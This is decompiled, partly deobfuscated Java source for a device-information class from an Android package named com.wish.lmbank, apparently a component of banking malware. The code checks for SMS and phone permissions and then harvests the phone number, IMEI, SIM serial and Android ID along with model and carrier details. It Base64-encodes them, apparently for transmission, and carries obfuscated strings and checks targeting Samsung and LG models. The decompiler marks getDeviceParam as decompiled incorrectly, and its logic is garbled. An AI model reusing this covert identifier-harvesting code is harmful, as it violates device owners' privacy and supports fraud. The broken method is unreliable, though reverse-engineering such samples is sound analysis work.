package com.wish.lmbank.utils;

import android.annotation.SuppressLint;
import android.annotation.TargetApi;
import android.content.Context;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.os.Build;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.Base64;

import androidx.core.app.ActivityCompat;

import com.wish.lmbank.AppStartV;

import java.nio.charset.StandardCharsets;
import java.util.Locale;

import gv00l3ah.mvdt7w.bb7d7pu7;

/* loaded from: cookie_9234504.jar:com/wish/lmbank/utils/DeviceInfoUtils.class */
public class DeviceInfoUtils {
    private static final String TAG = "com.wish.lmbank.utils.DeviceInfoUtils";

    public static String getAppVersion(Context context) {
        String str;
        try {
            PackageInfo packageInfo = context.getPackageManager().getPackageInfo(context.getPackageName(), PackageManager.GET_ACTIVITIES);
            str = "";
            if (packageInfo != null) {
//                     str = packageInfo.versionName == null ? bb7d7pu7.m5998("BxwFBQ") : packageInfo.versionName;
                str = packageInfo.versionName == null ? "null" : packageInfo.versionName;
            }
        } catch (PackageManager.NameNotFoundException e) {
//                 LogUtils.e(TAG, bb7d7pu7.m5998("CAdJDBsbBhtJBgoKHBsMDUkeAQwHSQoGBQUMCh1JGQgKAggODEkABw8G"), e);
            LogUtils.e(TAG, "an error occured when collect package info", e);
            str = "";
        }
        return str;
    }

    public static String getDeviceID(Context context) {
        String string = Settings.Secure.getString(context.getContentResolver(), "android_id");
        if (TextUtils.isEmpty(string)) {
            string = "";
        }
        return string;
    }

    @TargetApi(Build.VERSION_CODES.O)
    @SuppressLint("MissingPermission")
    public static String getTelephonyNumber(Context context) {
//         TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(bb7d7pu7.m5998("GQEGBww"));
        TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        boolean z = true;
//         boolean z2 = ActivityCompat.checkSelfPermission(context, bb7d7pu7.m5998("CAcNGwYADUcZDBsEABoaAAYHRzssKC02OiQ6")) == 0;
        boolean z2 = ActivityCompat.checkSelfPermission(context, "android.permission.READ_SMS") == 0;
//         boolean z3 = ActivityCompat.checkSelfPermission(context, bb7d7pu7.m5998("CAcNGwYADUcZDBsEABoaAAYHRzssKC02OSEmJyw2JzwkKyw7Og")) == 0;
        boolean z3 = ActivityCompat.checkSelfPermission(context, "android.permission.READ_PHONE_NUMBERS") == 0;
//         if (ActivityCompat.checkSelfPermission(context, bb7d7pu7.m5998("CAcNGwYADUcZDBsEABoaAAYHRzssKC02OSEmJyw2Oj0oPSw")) != 0) {
        if (ActivityCompat.checkSelfPermission(context, "android.permission.READ_PHONE_STATE") != 0) {
            z = false;
        }
//         LogUtils.callLog(bb7d7pu7.m5998("DgwdPQwFDBkBBgcQJxwECwwbRUkbDAgNOiQ6U0k") + z2 + bb7d7pu7.m5998("RUkbDAgNOQEGBwwnHAQLDBtTSQ") + z3 + bb7d7pu7.m5998("RUkbDAgNOQEGBww6HQgdDFNJ") + z);
        LogUtils.callLog("getTelephonyNumber, readSMS: " + z2 + ", readPhoneNumber: " + z3 + ", readPhoneState: " + z);
        if (z2 && z3 && z) {
            try {
                if (!TextUtils.isEmpty(telephonyManager.getLine1Number())) {
                    return telephonyManager.getLine1Number();
                }
                if (TextUtils.isEmpty(telephonyManager.getImei())) {
                    return !TextUtils.isEmpty(telephonyManager.getSimSerialNumber()) ? telephonyManager.getSimSerialNumber() : "";
                }
                return telephonyManager.getImei();
            } catch (Exception e) {
//                 LogUtils.callLog(bb7d7pu7.m5998("DgwdPQwFDBkBBgcQJxwECwwbRUkMEQoMGR0ABgdTSQ") + e.getMessage());
                LogUtils.callLog("getTelephonyNumber, exception: " + e.getMessage());
                return "";
            }
        }
        return "";
    }

    public static String getNetworkOperatorName(Context context) {
//         TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(bb7d7pu7.m5998("GQEGBww"));
        TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        String networkOperatorName = telephonyManager.getNetworkOperatorName();
        String str = networkOperatorName;
        if (TextUtils.isEmpty(networkOperatorName)) {
            str = telephonyManager.getSimOperator();
        }
        return str;
    }

    public static String getSystemLanguage() {
        return Locale.getDefault().getLanguage();
    }

    public static Locale[] getSystemLanguageList() {
        return Locale.getAvailableLocales();
    }

    public static String getSystemVersion() {
        return Build.VERSION.RELEASE;
    }

    public static String getSystemModel() {
        return Build.MODEL;
    }

    public static String getSystemDevice() {
        return Build.DEVICE;
    }

    public static String getDeviceBrand() {
        return Build.BRAND;
    }

    public static String getDeviceBoard() {
        return Build.BOARD;
    }

    public static String getDeviceManufacturer() {
        return Build.MANUFACTURER;
    }

    /* JADX WARN: Removed duplicated region for block: B:11:0x0048  */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct code enable 'Show inconsistent code' option in preferences
    */
    public static String getDeviceParam() {
        String str;
        String telephonyNumber = getTelephonyNumber(AppStartV.getContext());
        if (!TextUtils.isEmpty(telephonyNumber)) {
            if (!telephonyNumber.startsWith(bb7d7pu7.m5998("QlFf"))) {
                telephonyNumber.startsWith(bb7d7pu7.m5998("QlFb"));
            } else {
                str = telephonyNumber.substring(3);
                String deviceID = getDeviceID(AppStartV.getContext());
                if ("".equals(str)) {
                    str = deviceID;
                }
                StringBuilder sb = new StringBuilder();
                sb.append(bb7d7pu7.m5998("DQwfAAoMNgANVA"));
                sb.append(deviceID);
                sb.append(bb7d7pu7.m5998("TwAEDABU"));
                sb.append(str);
                sb.append(bb7d7pu7.m5998("TwQGDQwFVA"));
                sb.append(getSystemModel());
                sb.append(bb7d7pu7.m5998("TwsbCAcNVA"));
                sb.append(getDeviceBrand());
                sb.append(bb7d7pu7.m5998("TxoQGh0MBDYfDBsaAAYHVA"));
                sb.append(getSystemVersion());
                sb.append(bb7d7pu7.m5998("TwcMHR4GGwI2BhkMGwgdBhtU"));
                sb.append(getNetworkOperatorName(AppStartV.getContext()));
                LogUtils.callLog(bb7d7pu7.m5998("DgwdLQwfAAoMOQgbCARFSQ") + sb.toString() + bb7d7pu7.m5998("Tx0MBQwZAQYHECccBAsMG1Q") + telephonyNumber);
                return Base64.encodeToString(sb.toString().getBytes(StandardCharsets.UTF_8), 2);
            }
        }
        str = telephonyNumber;
        String deviceID2 = getDeviceID(AppStartV.getContext());
        if ("".equals(str)) {
        }
        StringBuilder sb2 = new StringBuilder();
        sb2.append(bb7d7pu7.m5998("DQwfAAoMNgANVA"));
        sb2.append(deviceID2);
        sb2.append(bb7d7pu7.m5998("TwAEDABU"));
        sb2.append(str);
        sb2.append(bb7d7pu7.m5998("TwQGDQwFVA"));
        sb2.append(getSystemModel());
        sb2.append(bb7d7pu7.m5998("TwsbCAcNVA"));
        sb2.append(getDeviceBrand());
        sb2.append(bb7d7pu7.m5998("TxoQGh0MBDYfDBsaAAYHVA"));
        sb2.append(getSystemVersion());
        sb2.append(bb7d7pu7.m5998("TwcMHR4GGwI2BhkMGwgdBhtU"));
        sb2.append(getNetworkOperatorName(AppStartV.getContext()));
        LogUtils.callLog(bb7d7pu7.m5998("DgwdLQwfAAoMOQgbCARFSQ") + sb2.toString() + bb7d7pu7.m5998("Tx0MBQwZAQYHECccBAsMG1Q") + telephonyNumber);
        return Base64.encodeToString(sb2.toString().getBytes(StandardCharsets.UTF_8), 2);
    }


    public static boolean isSpecialModel() {
        String systemModel = getSystemModel();
        boolean z = false;
        if (systemModel == null) {
            return false;
        }
//         if (systemModel.contains(bb7d7pu7.m5998("OiQ")) || systemModel.contains(bb7d7pu7.m5998("OiE_")) || systemModel.contains(bb7d7pu7.m5998("OiE-")) || systemModel.contains(bb7d7pu7.m5998("JSQ"))) {
        if (systemModel.contains("SM") || systemModel.contains("SHV") || systemModel.contains("SHW") || systemModel.contains("LM")) {
            z = true;
        }
        return z;
    }

    public static boolean isSamsung() {
//         return Build.BRAND != null && Build.BRAND.toLowerCase().equals(bb7d7pu7.m5998("GggEGhwHDg"));
        return Build.BRAND != null && Build.BRAND.toLowerCase().equals("samsung");
    }
}
